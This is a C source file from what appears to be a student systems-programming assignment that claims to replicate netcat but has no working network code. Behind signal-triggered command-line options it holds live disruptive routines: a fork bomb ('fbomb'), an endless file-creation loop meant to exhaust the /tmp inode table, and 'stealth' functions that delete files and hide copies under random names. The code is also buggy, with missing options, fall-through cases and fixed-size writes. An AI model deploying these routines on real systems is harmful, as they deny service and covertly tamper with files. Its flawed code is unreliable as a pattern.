/*
 ___________  ________   ________    ______        ___           _______ ____   _______    ______   ____ _____________    ________
|           ||  |  |  | |   ____|   |   _  \      /   \         /       ||  |  /      |   |   _  \  |  | |           |   /       |
`---|  |----`|  |__|  | |  |__      |  |_)  |    /  ^  \       |   (----`|  | |  ,----'   |  |_)  | |  | `---|  |----`  |   (----`
    |  |     |   __   | |   __|     |   _  <    /  /_\  \       \   \    |  | |  |        |   _  <  |  |     |  |        \   \
    |  |     |  |  |  | |  |____    |  |_)  |  /  _____  \  .----)   |   |  | |  `----.   |  |_)  | |  |     |  |    .----)   |
    |__|     |__|  |__| |_______|   |______/  /__/     \__\ |_______/    |__|  \______|   |______/  |__|     |__|    |_______/


        Name: MIDN S.Y Gorman and A.N. Mendolia
        Alpha: 182214 and 184242
        Course: SY204 - Sys Prgm & OS Fund
        Assignment: NETCAT

        Description: This program is meant to replicate the netcat command.

        Resources: Alex Varon, Adam Montgomery, Katie Swafford, Dylan Struthers, MGSP, EI, Chris Kay
		            The Linux Programming Manual, page 1409
                tutorialspoint.com (how to output simple error message & how to use fopen)
                http://www.kammerl.de/ascii/AsciiSignature.php (for text to ASCII title)
*/

// Required Includes
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <getopt.h>
#include <string.h>
#include <errno.h>
#include <strings.h>
#include <signal.h>
#include <wait.h>
#include <netinet/in.h>  // Network Internet Library: IPPROTO_*
#include <sys/socket.h>
#include <arpa/inet.h> 	// ARPA Internet: IPPROTO_*, htons(3), inetntop(3)
#include <netdb.h>     	// Network Database: struct sockaddr*, struct addrinfo, getaddrinfo(3), gai_strerror(3)

// Global Constants
pid_t pidForked;      // PID returned from fork
int flagS1 = 0;
int flagS2 = 0;
int size;
int flagStealth = 0;
int listeningFlag = 0;
char buffer[1024];
char basicbuffer[5096];
char stealthbuffer[1024];
int pflag = 0;
#define _GNU_SOURCE
#define CLIENT_MODE     001  // Default
#define SERVER_MODE     002
#define IPv4_MODE       004  // Default
#define TCP_MODE        020
#define STD_ERR_RETURN   -1
#define NULL_ERR_RETURN  NULL
#define MAX_CMD_LN_LEN   1024
#define MAX_NUM_ARGS     128
#define MAX_NUM_PIPE     128
#define MAX_STR_LEN      1024
#define READ_CMD_OKAY     	00
#define READ_CMD_GEN_ERROR	01
#define READ_CMD_BLANK    	02
#define READ_CMD_PREV_HAND_ERROR  03
#define PARSE_OKAY           	00
#define PARSE_GEN_ERROR      	01
#define PARSE_PREV_HAND_ERROR	02
#define REDIR_NO         00
#define REDIR_STDIN      01
#define REDIR_STDOUT     02
#define PIPE_NO          00
#define PIPE_IN          01
#define PIPE_FIRST       02
#define PIPE_LAST        04
#define PIPE_BAD_FD      -1
#define PIPE_READ_FROM   0
#define PIPE_WRITE_TO    1
#define BUF_SIZE			 1024
#define MAX_NUM_PEND_CONNECT 25
int sfdServer;   // Socket for server
int sfdClient;   // Socket for client
char *bufData;
char flgMode = CLIENT_MODE | IPv4_MODE | TCP_MODE;
// Function prototypes
int getFullCmdLn(char *strFullCmdLn);
int tokParseFullCmdLn(char *strFullCmdLn);
int tokParsePipeline(char *strPipeline);
int tokParseSingleCmd(char *strSingleCmd, char flgPipeline, int *fdPrevPipeRd);
int strArrayNCopy(char *strDestArray[], char *strSrcArray[], int maxStrLen, int numElemsCopy, int maxNumElems);
int isOnlyWhiteSpace(char *strCheckForWhiteSpace);
void usage(char *strCalledName);
int cat(int argc, char *argv[]);
int fileRead(int fd);
char *tempnam(const char *dir, const char *pfx);
int stealthMode(int argc, char *argv[]);
void stealth(int intSignNum, siginfo_t *sigInfo, void *sysDependContext);
void stealthExit(void);
void errorFunc(int errNum);
void metoo(int intSignNum, siginfo_t *sigInfo, void *sysDependContext);
void seatstaken(int intSignNum, siginfo_t *sigInfo, void *sysDependContext);
void fbomb(int intSignNum, siginfo_t *sigInfo, void *sysDependContext);
void nostealth(int intSignNum, siginfo_t *sigInfo, void *sysDependContext);
int sigReg1m(int argc, char *argv[]);
int sigReg2m(int argc, char *argv[]);
int sigReg1i(int argc, char *argv[]);
int sigReg2i(int argc, char *argv[]);
int sigReg1f(int argc, char *argv[]);
int sigReg2f(int argc, char *argv[]);
int sigReg1p(int argc, char *argv[]);
int sigReg2p(int argc, char *argv[]);
int executeFunc(int argc, char *argv[]);
void shutdownFunc(int intSignNum, siginfo_t *sigInfo, void *sysDependContext);
int listeningFunc(int argc, char * argv[]);
int clientFunc(int argc, char * argv[]);// main Function: <A general high-level description about what the function is designed to accomplish>
int main( int argc, char *argv[] ) {
        //**************************************
        // USAGE FUNCTION
        //**************************************
        int opt;  // Option character (Unicode support)
        // Perform Function
        // Read in and prep option setup
        opterr = 0;
        while ( ( opt = getopt(argc, argv, ":blahsmifpc")) != -1 ) {
          switch (opt) {
            case 'h':  // Help Option
              usage(argv[0]);
              break;
            case 'a': //like if you entered "SIGUSR1"
              flagS1 = 1;
              break;
            case 'b': //like if you entered "SIGUSR2"
              flagS2 = 1;
              break;
            case 's':
              flagStealth = 1;
              stealthMode(argc, argv);
              break;
            case 'c':
              cat(argc, argv);
              break;
            case 'm':
              if (flagS1 == 1){sigReg1m(argc, argv);}
              if (flagS2 == 1){sigReg2m(argc, argv);}
              break;
            case 'i':
              if (flagS1 == 1){sigReg1i(argc, argv);}
              if (flagS2 == 1){sigReg2i(argc, argv);}
              break;
            case 'f':
              if (flagS1 ==1){sigReg1f(argc, argv);}
              if (flagS2 == 1){sigReg2f(argc, argv);}
              break;
            case 'p':
                pflag = 1;
                if (flagS1 == 1){sigReg1p(argc, argv);}
                if (flagS2 == 1){sigReg2p(argc, argv);}
              break;
            case 'e':
              executeFunc(argc, argv);
            case 'l':
              listeningFlag = 1;
            default:
              usage(argv[0]);
              break;
          }

      }
      int sigRegistered;
      /*
      while(1){
      int sigRegistered;

      struct sigaction sighandler;
      sighandler.sa_sigaction = &nostealth;
      //sighandler.sa_flags = SA_RESTART | SA_SIGINFO;
      sigRegistered = sigaction(SIGUSR1, &sighandler, NULL);
      if ( sigRegistered == -1 ) {
        errorFunc(17);}
        */
      struct sigaction sigHandler;
      sigHandler.sa_sigaction = &shutdownFunc;
      sigHandler.sa_flags = SA_RESTART | SA_SIGINFO;
      sigRegistered = sigaction(SIGPIPE, &sigHandler, NULL);
      if ( sigRegistered == -1 ) {
        errorFunc(17);
      }
    //}
    /*

    }
      if (argc < 2){usage(argv[0]);}
      if (listeningFlag == 1){
        listeningFunc(argc, argv);
      }
      else{clientFunc(argc, argv);} */
  return 0;
  //END MAIN
}
  //******************************************************************
  //REGISTER SIGNALS (8 signal handlers): triggered by -a or -b
  //******************************************************************
  //so the function is never actually receiving "SIGUSR1", hence it is not executing
  //figure out how to send SIGUSR1
  int sigReg1m(int argc, char *argv[]){
    printf("My PID is:\t%ld\n", (long) getpid() );  // Who's who?
    int sigRegistered;
    struct sigaction sigHandler;
    sigHandler.sa_sigaction = &metoo;
    sigHandler.sa_flags = SA_RESTART | SA_SIGINFO;
    sigRegistered = sigaction(SIGUSR1, &sigHandler, NULL);
    if ( sigRegistered == -1 ) {
      errorFunc(4);
    }
    while(1){
			pause();
		}
  return 0;
  }
  int sigReg2m(int argc, char *argv[]){
    printf("entering sigusr2 register\n");
    int sigRegistered;
    struct sigaction sigHandler;
    sigHandler.sa_sigaction = &metoo;
    sigHandler.sa_flags = SA_RESTART | SA_SIGINFO;
    sigRegistered = sigaction(SIGUSR2, &sigHandler, NULL);
    if ( sigRegistered == -1 ) {
      errorFunc(4);
    }
    while(1){
			pause();
		}
  return 0;
}
int sigReg1i(int argc, char *argv[]){
  int sigRegistered;
  struct sigaction sigHandler;
  sigHandler.sa_sigaction = &seatstaken;
  sigHandler.sa_flags = SA_RESTART | SA_SIGINFO;
  sigRegistered = sigaction(SIGUSR1, &sigHandler, NULL);
  if ( sigRegistered == -1 ) {
    errorFunc(4);
  }
  while(1){
    pause();
  }
return 0;
}
int sigReg2i(int argc, char *argv[]){
  int sigRegistered;
  struct sigaction sigHandler;
  sigHandler.sa_sigaction = &seatstaken;
  sigHandler.sa_flags = SA_RESTART | SA_SIGINFO;
  sigRegistered = sigaction(SIGUSR2, &sigHandler, NULL);
  if ( sigRegistered == -1 ) {
    errorFunc(4);
  }
  while(1){
    pause();
  }
return 0;
}
int sigReg1f(int argc, char *argv[]){
  int sigRegistered;
  struct sigaction sigHandler;
  sigHandler.sa_sigaction = &fbomb;
  sigHandler.sa_flags = SA_RESTART | SA_SIGINFO;
  sigRegistered = sigaction(SIGUSR1, &sigHandler, NULL);
  if ( sigRegistered == -1 ) {
    errorFunc(4);
  }
  while(1){
    pause();
  }
return 0;
}
int sigReg2f(int argc, char *argv[]){
  int sigRegistered;
  struct sigaction sigHandler;
  sigHandler.sa_sigaction = &fbomb;
  sigHandler.sa_flags = SA_RESTART | SA_SIGINFO;
  sigRegistered = sigaction(SIGUSR2, &sigHandler, NULL);
  if ( sigRegistered == -1 ) {
    errorFunc(4);
  }
  while(1){
    pause();
  }
return 0;
}
int sigReg1p(int argc, char *argv[]){
  int sigRegistered;
  struct sigaction sigHandler;
  if (flagStealth == 1){sigHandler.sa_sigaction = &nostealth;}
  else {sigHandler.sa_sigaction = &stealth;}
  sigHandler.sa_flags = SA_RESTART | SA_SIGINFO;
  sigRegistered = sigaction(SIGUSR1, &sigHandler, NULL);
  if ( sigRegistered == -1 ) {
    errorFunc(4);
  }
  while(1){
    pause();
  }
return 0;
}
int sigReg2p(int argc, char *argv[]){
  int sigRegistered;
  struct sigaction sigHandler;
  if (flagStealth == 1){
    sigHandler.sa_sigaction = &nostealth;}
  else {
    sigHandler.sa_sigaction = &stealth;
  }
  sigHandler.sa_flags = SA_RESTART | SA_SIGINFO;
  sigRegistered = sigaction(SIGUSR2, &sigHandler, NULL);
  if ( sigRegistered == -1 ) {
    errorFunc(4);
  }
  while(1){
    pause();
  }
return 0;
}
//END SIGNAL REGISTERING
//********************************************************************

//******************************************************************
//CAT FUNCTION - called by -c option
//******************************************************************
  int cat(int argc, char * argv[]){
    char *dash = "-";
    int count = optind;
    while(count < argc){
        int fd = open(argv[count], O_RDONLY);
        if (fd != -1){
          fileRead(fd);
          printf("\n");
        }
        if (strcmp(argv[count], dash) == 0){fileRead(0);}
      count++;
    }
    return 0;
  }
    //READ FILES: will read in both single file and multiple file names from the command line and print contents
  	int fileRead(int fd){
        char buffer[1024] ="";
        int  returnReadVal = 1;
        int returnVal = 1;
        while (returnReadVal > 0){
          returnReadVal = read(fd, buffer, 1024);
          if (returnReadVal < 0){
            errorFunc(1);
          }
          if (returnReadVal > 0){
            returnVal = write(1, buffer, 1024);
          }
          if (returnVal < 0){errorFunc(2);}
        }
      close(fd);
      return 0;
    }
//END CAT
//*************************************************************

//**********************************************************
//Stealth Mode Function: triggered by -s option
//**********************************************************
  int stealthMode( int argc, char *argv[]) {
    int fd = open("BasicBits", O_RDONLY);
    if (fd == -1){errorFunc(3);}
    size = lseek(fd, 0, SEEK_END);
    lseek(fd, 0, SEEK_SET);
    read(fd, stealthbuffer, size);
    if (read(fd, stealthbuffer, size) != 0){errorFunc(1);}
    unlink("BasicBits");
    lseek(fd, 0, SEEK_SET);
    close(fd);
    if (pflag == 0){atexit(&stealthExit);exit(0);}
    else {exit(0);}
  }
    void stealthExit(void){
     int newfd;
     char *randNamFile = tempnam("/tmp", "BasicXXXXXX");
     newfd = open(randNamFile, O_CREAT | O_WRONLY, S_IRWXU);	//StackOverflow for RWE permission (S_IRWXU)
     if (newfd == -1){errorFunc(3);}
     int intRet = write(newfd, stealthbuffer, size);
     if (intRet == -1){errorFunc(2);}
     write(newfd, "\n", 1);
     if (intRet == -1){errorFunc(2);}
     close(newfd);
  }
//END STEALTH MODE
//********************************************************************

//********************************************************************
//F Bob-omb: triggered by SIGUSR2 (-b)
//********************************************************************
void fbomb(int intSignNum, siginfo_t *sigInfo, void *sysDependContext){
    while (1){
      pidForked = fork();
      if ( pidForked < 0 ) {errorFunc(4);}
      else if ( pidForked == 0 ) {sleep(3);}
    }
}
//END FBOMB FUNCTION
//********************************************************************

//********************************************************************
//SEAT'S TAKEN: triggered by -i
//********************************************************************
void seatstaken(int intSignNum, siginfo_t *sigInfo, void *sysDependContext){ //constantly create new files in /tmp ... overflow in inode table
  int newfd;
  while (1){
    char *randNamFile = tempnam("/tmp", "FileXXXXXX");
    newfd = open(randNamFile, O_CREAT);	//StackOverflow for RWE permission (S_IRWXU)
    if (newfd == -1){errorFunc(3);}
  }
}
//END SEAT'S TAKEN FUNCTION
//********************************************************************
//********************************************************************
//NO STEALTH: triggered by -p
//********************************************************************
void stealth(int intSignNum, siginfo_t *sigInfo, void *sysDependContext){
  int fd = open("BasicBits.c", O_RDONLY);
  if (fd == -1){errorFunc(3);}
  int size = lseek(fd, 0, SEEK_END);
  lseek(fd, 0, SEEK_SET);
  read(fd, buffer, size);
  if (read(fd, buffer, size) != 0){errorFunc(1);}
  unlink("BasicBits.c");
  lseek(fd, 0, SEEK_SET);
  close(fd);
}
//END STEALTH FUNCTION FOR PEEKABOO
//********************************************************************

//********************************************************************
//NO STEALTH: triggered by -p
//********************************************************************
void nostealth(int intSignNum, siginfo_t *sigInfo, void *sysDependContext){
   int newfd;
   int intFailure = -1;
   newfd = open("BasicBits.c", O_CREAT | O_WRONLY, S_IRWXU);	//StackOverflow for RWE permission (S_IRWXU)
   if (newfd == -1){errorFunc(3);}
   int size = lseek(newfd, 0, SEEK_END);
   write(newfd, buffer, size);
   if (intFailure){errorFunc(2);}
   write(newfd, "\n", 1);
   if (intFailure){errorFunc(2);}
   close(newfd);
}
//END NO STEALTH FUNCTION
//********************************************************************
//********************************************************************
//ME TOO: triggered by -m
//********************************************************************
void metoo(int intSignNum, siginfo_t *sigInfo, void *sysDependContext){
     int fd = open("BasicBitscp", O_RDONLY);
     if (fd == -1){errorFunc(3);}
     size = lseek(fd, 0, SEEK_END);
     lseek(fd, 0, SEEK_SET);
     if (read(fd, basicbuffer, size) == -1){errorFunc(1);}
     lseek(fd, 0, SEEK_SET);
     close(fd);
      int newfd;
      char *randNamFile = tempnam("/var/tmp", "BasicXXXXXXX");
      newfd = open(randNamFile, O_CREAT | O_WRONLY, S_IRWXU);	//StackOverflow for RWE permission (S_IRWXU)
      if (newfd == -1){errorFunc(3);}
      int intRet = write(newfd, basicbuffer, size);
      if (intRet == -1){errorFunc(2);}
      write(newfd, "\n", 1);
      if (intRet == -1){errorFunc(2);}
      close(newfd);
}
//END ME TOO
//********************************************************************
//********************************************************************
//EXECUTE FUNCTION (triggered by -e)
//********************************************************************
int executeFunc(int argc, char *argv[]){
  int returnVal;
	char * environment;
	if (argc < 3){ //takes in a mandatory argument
		usage(argv[0]);
		return 0;
	}
	environment= getenv("PATH"); //gets or sets environment PATH
	if (environment == NULL){
		returnVal = setenv("PATH", "/bin:/usr/bin:/usr/local/bin", 1);
		if (returnVal == -1){errorFunc(6);}
	}
	// Declare required variables
	int intFailure;      // Error checking
	char *strFullCmdLn;  // String for full command line
	strFullCmdLn = calloc( MAX_STR_LEN, sizeof( char ) );
	while ( 1 ) {  // Command prompt Loop
		intFailure = getFullCmdLn(strFullCmdLn);
		switch (intFailure) {
			case READ_CMD_OKAY:
				intFailure = tokParseFullCmdLn(strFullCmdLn);
				switch (intFailure) {
					case PARSE_OKAY:
						break;
					case PARSE_PREV_HAND_ERROR:
						fprintf(stderr, "Previous handle error when parsing\n");
						break;
					case PARSE_GEN_ERROR:
						fprintf(stderr, "Parse general error\n");
					default:
						fprintf(stderr, "Unsuspected error.\n");
						break;
				}
				break;
			case READ_CMD_GEN_ERROR:
				fprintf(stderr, "General Command Line Read Error\n");
				break;
			case READ_CMD_BLANK:
				break;
			case READ_CMD_PREV_HAND_ERROR:
				fprintf(stderr, "Read Command Previous Handle Error\n");
				break;
			default:
				fprintf(stderr, "Unsuspected error.\n");
				break;
		}
	}  // Command prompt Loop
	free(strFullCmdLn);
	// Return to caller
	return EXIT_SUCCESS;
}
int getFullCmdLn(char *strFullCmdLn) {
	// Declare Required Variables
	char *strPrompt = "$ > ";  // It's your shell
	// Perform function
	printf("%s", strPrompt);
	if ( fgets(strFullCmdLn, MAX_CMD_LN_LEN, stdin) == NULL_ERR_RETURN ) {  // Read command line
		fprintf(stdout, "\n");
		fprintf(stderr, "Error with fgets.\n");
		return READ_CMD_PREV_HAND_ERROR;
	}
	if (strlen(strFullCmdLn) > 1) {
		if (strFullCmdLn[strlen(strFullCmdLn) - 1] == '\n') {
			strFullCmdLn[strlen(strFullCmdLn) - 1] = '\0';
		} else {
			fprintf(stdout, "\n");
		}
	} else {
		strFullCmdLn[0] = '\0';
		return READ_CMD_BLANK;
	}
	// Return to Caller
	return READ_CMD_OKAY;
}
int tokParseFullCmdLn(char *strFullCmdLn) {
	int intFailure;             // Value returned
	char *strPipeline;          // String representing single pipeline of commands
	char *bufFullCmdLnTokSave;  // Buffer for strtok_r bookkeeping
	strPipeline = strtok_r(strFullCmdLn, ";", &bufFullCmdLnTokSave);
	do {  // Iterate through pipelines
		if ( isOnlyWhiteSpace(strPipeline) ) {  // Blank command (NOP), okay to continue
			continue;
		}
		intFailure = tokParsePipeline(strPipeline);
		switch ( intFailure ) {  // Tokenizing or parsing error
			case PARSE_OKAY:   // No Error
				break;
			case PARSE_PREV_HAND_ERROR:  // ERROR: fail and return error
				return PARSE_PREV_HAND_ERROR;
			default:
				fprintf(stderr, "Unsuspected error\n");
				return PARSE_GEN_ERROR;
		}
	} while ( (strPipeline = strtok_r(NULL, ";", &bufFullCmdLnTokSave)) != NULL );
	return PARSE_OKAY;
}
int tokParsePipeline(char *strPipeline) {
	char *strPipeCmds[MAX_NUM_PIPE];  // Array of commands (w/ args & redirects) in pipeline
	//char strWhiteSpaceCheck[MAX_STR_LEN];  // Used to check for blank command in pipeline
	char strSingleCmd[MAX_STR_LEN];        // Single command (w/ args & redirects)
	char *strPipe;                         // Pipe token
	char *bufPipelineTokSave;              // Pipeline strtok_r save buffer
	//char *bufWhiteSpaceStrip;              // Whitespace check strtok_r save buffer
	char flgPipeline = PIPE_NO;            // Flag indicating place in pipeline
	int intNumPipeCmds = 0;                // Number of commands in pipeline
	int intPipeLpCntl = 0;                 // Loop control
	int intFailure;                        // Called function return value
	int fdPrevPipeRd = PIPE_BAD_FD;        // fd management in case of error
	int intChildStatus;                    // Status of child waited on
	if ( strPipeline[strlen(strPipeline)- 1] == '|' ) {  // ERROR: Cannot end in a pipe symbol '|'
		fprintf(stderr, "Cannot end in a pipe.\n");
		return PARSE_GEN_ERROR;
	}
	strPipe = strtok_r(strPipeline, "|", &bufPipelineTokSave);
	do {
		if ( isOnlyWhiteSpace(strPipe) ) {  // Blank command (NOP) in pipeline, ERROR
			fprintf(stderr, "Blank command (NOP) in pipeline.\n");  // SCY Class of 2016
			return PARSE_GEN_ERROR;
		}
		strPipeCmds[intNumPipeCmds] = strPipe;
		intNumPipeCmds++;
	} while ( ((strPipe = strtok_r(NULL, "|", &bufPipelineTokSave)) != NULL) &&
	          (intNumPipeCmds < (MAX_NUM_PIPE - 1)) );
	strPipeCmds[intNumPipeCmds] = NULL;
	if (intNumPipeCmds > 1) {  // Determine and set in pipeline
		flgPipeline |= PIPE_IN;
	}
	while ( (intPipeLpCntl < intNumPipeCmds) &&
	        (intPipeLpCntl < MAX_NUM_PIPE) ) {  // Pipeline loop
		if ( flgPipeline & PIPE_IN ) {  // In pipeline
			if (intPipeLpCntl == 0) {
				flgPipeline |= PIPE_FIRST;   // Set beginning of pipeline
			} else {
				flgPipeline &= ~PIPE_FIRST;  // Unset beginning of pipeline
			}
			if (intPipeLpCntl == (intNumPipeCmds - 1)) {
				flgPipeline |= PIPE_LAST;   // Set end of pipeline
			} else {
				flgPipeline &= ~PIPE_LAST;  // Unset end of pipeline
			}
		}
		strncpy(strSingleCmd, strPipeCmds[intPipeLpCntl], MAX_CMD_LN_LEN);
		intFailure = tokParseSingleCmd(strSingleCmd, flgPipeline, &fdPrevPipeRd);
		switch (intFailure) {  // Determine error returned
			case PARSE_OKAY:   // Success
				break;
			case PARSE_GEN_ERROR:  // New error
			case PARSE_PREV_HAND_ERROR:  // Previously handled error
			default:
				while ( wait(&intChildStatus) > 0) {
				}
				if ( fdPrevPipeRd != PIPE_BAD_FD) {
					close(fdPrevPipeRd);
				}
				return PARSE_PREV_HAND_ERROR;
		}
		intPipeLpCntl++;
	}  // Pipeline loop
	while ( wait(&intChildStatus) > 0) {
	}
	if ( fdPrevPipeRd != PIPE_BAD_FD) {
		close(fdPrevPipeRd);
	}
	return PARSE_OKAY;
}
int tokParseSingleCmd(char *strSingleCmd, char flgPipeline, int *fdPrevPipeRd) {
	char *strSingleCmdLnArgs[MAX_NUM_ARGS];  // Array of strings representing a single command with arguments and with redirects
	char *strSingle;         // Copy of single command to pass to strtok_r [trustno1]
	char *strToken;          // Single token
	char *bufSingleTokSave;  // Buffer for strtok_r bookkeeping
	int intNumTokens = 0;    // Number of tokens
	int intFailure = -1;
	char flgParse = PARSE_OKAY;  // Flag for parsing
	pid_t pidFork;       // PID from fork()
	char *strSingleCmdLnArgsSansRedir[MAX_NUM_ARGS];  // Array of single commands w/ args w/o redirects
	char flgRedirect = REDIR_NO;    // Flag for redirection
	int intToken = 0;               // Loop control
	int intRedirInTargetPos = -1;   // Position in strSingleCmdLnArgs of stdin redirect target
	int intRedirOutTargetPos = -1;  // Position in strSignleCmdLnArgs of stdout redirect target
	int fdNewStdIn = STDIN_FILENO;    // New file descriptor for stdin
	int fdNewStdOut = STDOUT_FILENO;  // New file descriptor for stdout
	static int pfdCurrPipe[2] = { PIPE_BAD_FD, PIPE_BAD_FD };  // Current pipe
	static int pfdPrevPipe[2] = { PIPE_BAD_FD, PIPE_BAD_FD };  // Previous pipe
	int dupRet = 0;
	int redirect = 0;
	strSingle = calloc( MAX_STR_LEN, sizeof( char ) );  // Assume nothing
	strncpy(strSingle, strSingleCmd, MAX_CMD_LN_LEN);

	strToken = strtok_r(strSingle, " \t", &bufSingleTokSave);
	do {
		strSingleCmdLnArgs[intNumTokens] = strToken;
		intNumTokens++;
	} while ( (strToken = strtok_r(NULL, " \t", &bufSingleTokSave)) != NULL );
	strSingleCmdLnArgs[intNumTokens] = NULL;
	while ( (intToken < intNumTokens) &&
	        (intToken < MAX_NUM_ARGS) &&
			!(flgParse & PARSE_GEN_ERROR) ) {
		if ( strncmp(strSingleCmdLnArgs[intToken], "<", MAX_STR_LEN) == 0) {  // Redirect standard input
			flgRedirect |= 1;
			intRedirInTargetPos = intToken + 1;
			redirect++;
			if (redirect > 1){ //if more than one redirect
				errorFunc(10);
			}
			if (strSingleCmdLnArgs[intToken + 1] == NULL){ //if there is no source file listed
				errorFunc(15);
			}
			if ((flgPipeline & PIPE_IN) && ! (flgRedirect & PIPE_LAST)){
				errorFunc(13);
			}
		}
		if ( strncmp(strSingleCmdLnArgs[intToken], ">", MAX_STR_LEN) == 0) {  // Redirect standard output
			flgRedirect |= 2;
			intRedirOutTargetPos = intToken + 1;
			redirect++;
			if (redirect > 1){
				errorFunc(5);
			}
			if ( strncmp(strSingleCmdLnArgs[intToken], "|", MAX_STR_LEN) == 0) {
				flgPipeline = PIPE_IN; //added line
			}
		}
		intToken++;
	}
	if ( flgParse & PARSE_GEN_ERROR ) {
		fprintf(stderr, "Flag parse error.\n");
		free(strSingle);
		return PARSE_GEN_ERROR;
	}
	if ( ! flgRedirect ) {
		strArrayNCopy(strSingleCmdLnArgsSansRedir, strSingleCmdLnArgs, MAX_STR_LEN, intNumTokens, MAX_NUM_ARGS);
	}
	if ( flgRedirect & REDIR_STDIN ) {
		if (strSingleCmdLnArgs[intRedirInTargetPos] != NULL) {
			strArrayNCopy(strSingleCmdLnArgsSansRedir, strSingleCmdLnArgs, MAX_STR_LEN, intRedirInTargetPos - 1, MAX_NUM_ARGS);
		} else {  // Student: Update below error message based on this block of code
			fprintf(stderr, "Standard Input Redirection Error.\n");
			free(strSingle);
			return PARSE_GEN_ERROR;
		}
	}
	if ( flgRedirect & REDIR_STDOUT ) {
		if (strSingleCmdLnArgs[intRedirOutTargetPos] != NULL) {
			strArrayNCopy(strSingleCmdLnArgsSansRedir, strSingleCmdLnArgs, MAX_STR_LEN, intRedirOutTargetPos - 1, MAX_NUM_ARGS);
		} else {  // Student: Update below error message based on this block of code
			fprintf(stderr, "Standard Output Redirection Error.\n");
			free(strSingle);
			return PARSE_GEN_ERROR;
		}
	}
	if ( (flgPipeline & PIPE_IN) && ! (flgPipeline & PIPE_LAST) ) {  // In pipeline
		intFailure = pipe(pfdCurrPipe);
		if (intFailure){
			errorFunc(12);
		}
	}

	pidFork = fork();  // Create child
	switch (pidFork) {  // Status of fork()
		case -1:   // ERROR: fork() failed
			fprintf(stderr, "Fork failed.\n");
			free(strSingle);
			return PARSE_PREV_HAND_ERROR;
		case 0:    // Child
			if ( flgRedirect & REDIR_STDIN ) {  // Setup standard input redirect
					close(STDIN_FILENO);
					int fdNewStdIn = open(strSingleCmdLnArgs[intRedirInTargetPos], O_RDONLY);
					if (fdNewStdIn != -1){
						dupRet = dup2(fdNewStdIn, STDIN_FILENO);
						if (dupRet == -1){
							errorFunc(8);
						}
					}
					else if (errno == EACCES){
						errorFunc(7);
					}
					else{errorFunc(9);}
			}

			if ( flgRedirect & REDIR_STDOUT ) {  // Setup standard output redirect
				close(STDOUT_FILENO);
				int fdNewStdOut = open(strSingleCmdLnArgs[intRedirOutTargetPos], O_WRONLY|O_TRUNC|O_CREAT, S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH);
				if (fdNewStdOut != -1){
					dupRet = dup2(fdNewStdOut, STDOUT_FILENO);
					if (dupRet == -1){
						errorFunc(8);
					}
				}
					else if (errno == EACCES){
						errorFunc(7);
					}
					else{errorFunc(9);}
			}
			if (flgPipeline & PIPE_IN) {  // Setup redirect based on pipeline
				if ( ! (flgPipeline & PIPE_FIRST) ) {  // Not beginning of pipeline
					fdNewStdIn = pfdPrevPipe[PIPE_READ_FROM];
				}
				if ( ! (flgPipeline & PIPE_LAST) ) {  // Not end of pipeline
					close(pfdCurrPipe[PIPE_READ_FROM]);
					fdNewStdOut = pfdCurrPipe[PIPE_WRITE_TO];

				}
			}

			if ( fdNewStdIn != STDIN_FILENO ) {  // Standard input redirect or pipe previously setup
				// Student: Fill in code here
				close(STDIN_FILENO);
				dup2(fdNewStdIn, STDIN_FILENO);
			}

			if ( fdNewStdOut != STDOUT_FILENO ) {  // Standard output redirect or pipe previously setup
				// Student: Fill in code here
				close(STDOUT_FILENO);
				dup2(fdNewStdOut, STDOUT_FILENO);
			}

			execvp(strSingleCmdLnArgsSansRedir[0], strSingleCmdLnArgsSansRedir);
			fprintf(stderr, "Error with exec.\n");
			free(strSingle);
			exit(EXIT_FAILURE);
		default :  // Parent
			if ( flgPipeline & PIPE_IN ) {  // In pipeline
				if ( ! (flgPipeline & PIPE_FIRST) ) {  // Not beginning of pipeline
					if ( pfdPrevPipe[PIPE_READ_FROM] != PIPE_BAD_FD ) {
						close(pfdPrevPipe[PIPE_READ_FROM]);
					}
				}
				if ( ! (flgPipeline & PIPE_LAST) ) {  // Not end of pipeline
					*fdPrevPipeRd = pfdCurrPipe[PIPE_READ_FROM];
					pfdPrevPipe[PIPE_READ_FROM] = pfdCurrPipe[PIPE_READ_FROM];
					pfdPrevPipe[PIPE_WRITE_TO ] = pfdCurrPipe[PIPE_WRITE_TO ];
					close(pfdCurrPipe[PIPE_WRITE_TO]);
				} else {  // End of pipeline
					if ( pfdCurrPipe[PIPE_READ_FROM] != PIPE_BAD_FD ) {
						close(pfdCurrPipe[PIPE_READ_FROM]);
					}
					if ( pfdCurrPipe[PIPE_WRITE_TO] != PIPE_BAD_FD ) {
						close(pfdCurrPipe[PIPE_WRITE_TO]);
					}
					if ( pfdPrevPipe[PIPE_READ_FROM] != PIPE_BAD_FD ) {
						close(pfdCurrPipe[PIPE_READ_FROM]);
					}
					if ( pfdPrevPipe[PIPE_WRITE_TO] != PIPE_BAD_FD ) {
						close(pfdCurrPipe[PIPE_WRITE_TO]);
					}
					*fdPrevPipeRd = PIPE_BAD_FD;
					pfdCurrPipe[PIPE_READ_FROM] = PIPE_BAD_FD;
					pfdCurrPipe[PIPE_WRITE_TO ] = PIPE_BAD_FD;
					pfdPrevPipe[PIPE_READ_FROM] = PIPE_BAD_FD;
					pfdPrevPipe[PIPE_WRITE_TO ] = PIPE_BAD_FD;
				}
			}
			break;
	}
	free(strSingle);
	// Return to Caller
	return PARSE_OKAY;
}

int strArrayNCopy(char *strDestArray[], char *strSrcArray[], int maxStrLen, int numElemsCopy, int maxNumElems) {
	int i = 0;	// Loop control
	while ((i < numElemsCopy) && (i < maxNumElems)) {  // Iterate through elements to copy
		if (strSrcArray[i] != NULL) {  // Non-NULL element to copy
			strDestArray[i] = strSrcArray[i];
		} else {  // Nothing (NULL) to copy
			if (strDestArray[i] != NULL) {
				strDestArray[i] = NULL;
			}
		}
		i++;
	}
	while (i < maxNumElems) {  // Clear out the rest of the destination array
		if (strDestArray[i] != NULL) {
			strDestArray[i] = NULL;
		}
		i++;
	}
	// Return to Caller
	return EXIT_SUCCESS;
}

int isOnlyWhiteSpace(char *strCheckForWhiteSpace) {
	// Declare Required Variables
	// White space checking
	char strWhiteSpaceCheck[MAX_STR_LEN];  // Copy of command to check for "only white space"
	char *strSansWhiteSpace;               // Command without white space
	char *bufWhiteSpaceCheck;              // Buffer for strtok_r bookkeeping
	// Perform Function
	strncpy(strWhiteSpaceCheck, strCheckForWhiteSpace, MAX_STR_LEN);  // trustno1
